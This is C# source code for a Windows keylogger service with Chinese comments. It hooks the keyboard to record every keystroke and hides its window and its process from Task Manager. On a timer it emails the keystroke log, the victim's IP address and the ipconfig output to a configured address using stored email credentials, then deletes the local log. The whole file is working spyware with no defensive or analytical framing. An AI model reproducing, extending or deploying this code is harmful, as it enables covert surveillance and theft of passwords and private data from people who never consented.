using KeyboardMonitor.Common;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace KeyboardMonitor
{
	public partial class KeyboardMonitorService : ServiceBase
	{
		/// <summary>
		/// 启动服务参数
		/// </summary>
		string[] args = null;
		public KeyboardMonitorService()
		{
			try
			{

				InitializeComponent();

				this.InitKeyboardMonitorService();
				this.OnStart(this.args);
			}
			catch (Exception)
			{

				throw;
			}
		}
		/// <summary>
		/// 初始化服务
		/// </summary>
		private void InitKeyboardMonitorService()
		{
			this.args = new string[]
			{ 
				
			};
			while (true)
			{
				try
				{
					Application.Run(new Form());
				}
				catch (Exception ee)
				{
					//LogHelper.WriteLog(ee.Message);
				}
			}
		}


		protected override void OnStart(string[] args)
		{
		}
		

		protected override void OnStop()
		{
			Application.Exit();
		}

		private void AppliectionExit(object sender, EventArgs e)
		{
			
			Application.Exit();
			//调用进程管理器推出当前程序
			string exit = "taskkill -f -im "+ Form.ApplicetionName;
			using (Cmd cmd = new Cmd())
			{
				cmd.ExecCommand(exit);
			}
		}

	}
	public class Form : System.Windows.Forms.Form
	{
		/// <summary>
		/// Required designer variable.
		/// </summary>
		private System.ComponentModel.IContainer components = null;

		/// <summary>
		/// 监听钩子
		/// </summary>
		KeyboardMonitor.KeyboardHook.KeyBordHook bordHook = null;
		/// <summary>
		/// 按下的所有按键
		/// </summary>
		List<Keys> keys = null;
		/// <summary>
		/// 任务管理器？？？
		/// 先就这么备注吧
		/// </summary>
		private HideTaskmgrList hideTaskmgrList = null;
		/// <summary>
		/// 当前程序名称
		/// </summary>
		public static string ApplicetionName;
		private System.Windows.Forms.Timer timer = null;
		public Form()
		{
			this.InitializeComponent();
			this.InitForm();
		}

		private void InitializeComponent()
		{
			try
			{

				this.components = new System.ComponentModel.Container();
				System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form));
				this.SuspendLayout();
				this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 15F);
				this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
				this.ClientSize = new System.Drawing.Size(0, 0);
				this.Name = "";
				this.Text = "";
				this.KeyDown += new KeyEventHandler(this.OnKeyDownEvent);
				this.KeyPress += new KeyPressEventHandler(this.OnKeyPressEvent);
				this.KeyUp += new KeyEventHandler(this.OnKeyUpEvent);

				//timer
				this.timer = new System.Windows.Forms.Timer();
				this.timer.Enabled = true;
				this.timer.Interval = int.Parse(global::KeyboardMonitor.Properties.Resource.CommitDataInterval);
				this.timer.Tick += new EventHandler(this.TimerCommitData);

				//隐藏窗体程序
				//this.Hide();
				//this.Visible = false;
				//this.FormBorderStyle = FormBorderStyle.None;
				this.WindowState = FormWindowState.Minimized;
				this.ShowInTaskbar = false;
				SetVisibleCore(false);
				this.ResumeLayout(false);
			}
			catch (Exception)
			{

				throw;
			}
		}

		private void TimerCommitData(object sender, EventArgs e)
		{
			try
			{
				string[] dataArray = this.keys.Select(
							(keys) => keys.ToString()
						).ToArray();
				string data = string.Join(",", dataArray);
				//写入本地文件
				string dateTime = DateTime.Now.ToString("yyyyMMddHHmmss");
				//data = "\n=======================================================" + dateTime
				//	+ "\n"+data
				//	+ "\n=======================================================" + dateTime;
				data = "," + data;
				LogHelper.WriteLog(data);
				this.keys.Clear();
				//throw new Exception();
				//本地文件有内容且网络正常发送邮件
				if (LogHelper.GetFileSize()!=0
					&&(KeyboardMonitor.API.WinNet.InternetCheckConnection() == true))
				{
					using (Commit commit = new Commit())
					{
						System.Net.NetworkCredential form = new System.Net.NetworkCredential()
						{
							UserName = global::KeyboardMonitor.Properties.Resource.FormDataEmail,
							Password = global::KeyboardMonitor.Properties.Resource.FormDataEmailPassword,
						};
						Cmd cmd = new Cmd();
						string to = global::KeyboardMonitor.Properties.Resource.ToDataEmail;
						string subject = commit.GetIP();
						string body = cmd.ExecCommand("ipconfig");
						string attachment = global::KeyboardMonitor.Properties.Resource.LogFilePath;
						commit.SendEmail(form, new string[] { to }, subject, body, attachment,true);
						//发送成功之后清空本地文件
						LogHelper.Clear();
					}

				}
			}
			catch (Exception ee)
			{
				throw;
			}
		}

		protected void InitForm()
		{
			try
			{

				//初始化钩子
				this.bordHook = new KeyboardHook.KeyBordHook(
					new KeyEventHandler(this.OnKeyDownEvent)
					, new KeyPressEventHandler(this.OnKeyPressEvent)
					, new KeyEventHandler(this.OnKeyUpEvent));

				//初始化按键集合
				this.keys = new List<Keys>();

				//获取进程名称
				Process curProcess = Process.GetCurrentProcess();
				ProcessModule curModule = curProcess.MainModule;
				Form.ApplicetionName = curModule.ModuleName;

				//在任务管理器中隐藏当前进程
				this.hideTaskmgrList = new HideTaskmgrList();
				this.hideTaskmgrList.ProcessName = Form.ApplicetionName;
				this.hideTaskmgrList.Start();
			}
			catch (Exception)
			{

				throw;
			}
		}
		protected override void SetVisibleCore(bool value)
		{
			base.SetVisibleCore(value);
		}
		protected override void OnShown(EventArgs e)
		{
			base.OnShown(e);
			this.Visible = false;
		}
		/// <summary>
		/// 键盘松开
		/// </summary>
		/// <param name="sender"></param>
		/// <param name="e"></param>
		private void OnKeyUpEvent(object sender, KeyEventArgs e)
		{
		}

		/// <summary>
		/// 键盘按下
		/// </summary>
		/// <param name="sender"></param>
		/// <param name="e"></param>
		private void OnKeyDownEvent(object sender, KeyEventArgs e)
		{
			  this.keys.Add(e.KeyData);
		}

		/// <summary>
		/// 
		/// </summary>
		/// <param name="sender"></param>
		/// <param name="e"></param>
		private void OnKeyPressEvent(object sender, KeyPressEventArgs e)
		{

		}


		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		/// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
		protected override void Dispose(bool disposing)
		{
			if (disposing && (components != null))
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}
	}
}
